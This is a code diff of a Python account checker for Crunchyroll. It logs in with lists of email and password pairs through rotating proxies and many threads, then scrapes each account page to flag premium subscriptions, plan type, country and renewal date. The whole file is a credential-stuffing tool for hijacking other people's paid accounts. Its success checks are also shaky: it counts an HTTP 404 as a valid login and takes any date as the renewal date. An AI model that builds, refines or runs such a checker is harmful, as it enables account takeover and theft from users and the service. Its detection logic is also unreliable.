@@ -1,13 +1,12 @@
 import requests
-import uuid
+import re
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
 import config
 
 class CrunchyrollChecker:
-    def __init__(self, auth_header, proxies=None, threads=10):
-        self.auth_header = auth_header
+    def __init__(self, proxies=None, threads=10):
         self.proxies = proxies or []
         self.threads = threads
         self.results = []
@@ -59,75 +58,97 @@ class CrunchyrollChecker:
             'error': ''
         }
         
-        device_id = str(uuid.uuid4())
-        url = "https://beta-api.crunchyroll.com/auth/v1/token"
-        
-        headers = {
-            'Authorization': self.auth_header,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Crunchyroll/3.54.5 Android/16'
-        }
-        
-        data = {
-            "grant_type": "password",
-            "username": email,
-            "password": password,
-            "scope": "offline_access",
-            "device_id": device_id,
-            "device_name": "CrunchyChecker",
-            "device_type": "com.crunchyroll.mobile"
-        }
-        
         proxies_dict = self.parse_proxy(proxy) if proxy else None
+        session = requests.Session()
         
         try:
-            response = requests.post(url, headers=headers, data=data, 
-                                    proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
+            # Step 1: Login to Crunchyroll
+            login_url = "https://www.crunchyroll.com/authenticate"
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Content-Type': 'application/x-www-form-urlencoded',
+            }
             
-            if response.status_code == 200:
-                token_data = response.json()
-                access_token = token_data.get('access_token')
+            data = {
+                'login_form[username]': email,
+                'login_form[password]': password,
+                'submit': 'Log in'
+            }
+            
+            response = session.post(login_url, headers=headers, data=data, 
+                                   proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
+            
+            # Crunchyroll returns 404 on successful login (weird but normal)
+            if response.status_code in [200, 404]:
+                # Step 2: Get account page to check premium status
+                account_url = "https://www.crunchyroll.com/account"
+                acc_response = session.get(account_url, headers=headers, 
+                                          proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
                 
-                if access_token:
-                    acc_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
-                    acc_headers = {'Authorization': f'Bearer {access_token}'}
-                    acc_response = requests.get(acc_url, headers=acc_headers, 
-                                                proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
+                if acc_response.status_code == 200:
+                    text = acc_response.text.lower()
                     
-                    if acc_response.status_code == 200:
-                        acc_info = acc_response.json()
-                        result['verified'] = acc_info.get('email_verified', False)
-                        result['created'] = acc_info.get('created', '').split('T')[0] if acc_info.get('created') else ''
-                        external_id = acc_info.get('external_id')
-                        
-                        if external_id:
-                            sub_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}"
-                            sub_response = requests.get(sub_url, headers=acc_headers,
-                                                       proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
-                            
-                            if sub_response.status_code == 200:
-                                sub_info = sub_response.json()
-                                result['success'] = sub_info.get('is_active', False)
-                                result['active'] = sub_info.get('is_active', False)
-                                result['plan'] = sub_info.get('subscription_plan', 'None')
-                                result['country'] = sub_info.get('country_code', 'Unknown')
-                                result['renewal'] = sub_info.get('next_renewal_date', '').split('T')[0] if sub_info.get('next_renewal_date') else ''
-                            else:
-                                result['success'] = False
-                                result['plan'] = 'Free'
-                    else:
+                    # Premium keywords that indicate paid subscription
+                    premium_indicators = [
+                        'mega fan', 'ultimate fan', 'fan member', 
+                        'premium member', 'premium plan', 'membership'
+                    ]
+                    
+                    # Check if ANY premium indicator exists
+                    is_premium = any(indicator in text for indicator in premium_indicators)
+                    
+                    # Also check - if "upgrade to premium" is NOT present but "premium" IS present
+                    has_upgrade = 'upgrade to premium' in text or 'upgrade now' in text
+                    has_premium_word = 'premium' in text
+                    
+                    if is_premium or (has_premium_word and not has_upgrade):
                         result['success'] = True
-                        result['plan'] = 'Premium'
+                        result['active'] = True
                         
-            elif response.status_code == 401:
-                result['error'] = "Wrong password"
-            elif response.status_code == 429:
-                result['error'] = "Rate limited"
+                        # Detect plan type
+                        if 'ultimate fan' in text:
+                            result['plan'] = 'Ultimate Fan'
+                        elif 'mega fan' in text:
+                            result['plan'] = 'Mega Fan'
+                        elif 'fan' in text and 'mega' not in text:
+                            result['plan'] = 'Fan'
+                        else:
+                            result['plan'] = 'Premium'
+                        
+                        # Extract country
+                        country_match = re.search(r'"country":"([^"]+)"', acc_response.text)
+                        if country_match:
+                            result['country'] = country_match.group(1).upper()
+                        
+                        # Extract renewal date
+                        date_patterns = [
+                            r'renews on (\d{4}-\d{2}-\d{2})',
+                            r'next renewal (\d{4}-\d{2}-\d{2})',
+                            r'next billing date (\d{4}-\d{2}-\d{2})',
+                            r'(\d{4}-\d{2}-\d{2})'
+                        ]
+                        for pattern in date_patterns:
+                            date_match = re.search(pattern, text)
+                            if date_match:
+                                result['renewal'] = date_match.group(1)
+                                break
+                        
+                        # Try to get email verification from account page
+                        if 'verified' in text:
+                            result['verified'] = True
+                    else:
+                        result['error'] = "Free account"
+                else:
+                    result['error'] = f"HTTP {acc_response.status_code}"
             else:
-                result['error'] = f"HTTP {response.status_code}"
+                result['error'] = "Invalid credentials"
                 
-        except Exception as e:
+        except requests.exceptions.Timeout:
+            result['error'] = "Timeout"
+        except requests.exceptions.ConnectionError:
             result['error'] = "Connection error"
+        except Exception as e:
+            result['error'] = f"Error: {str(e)[:30]}"
         
         return result
     
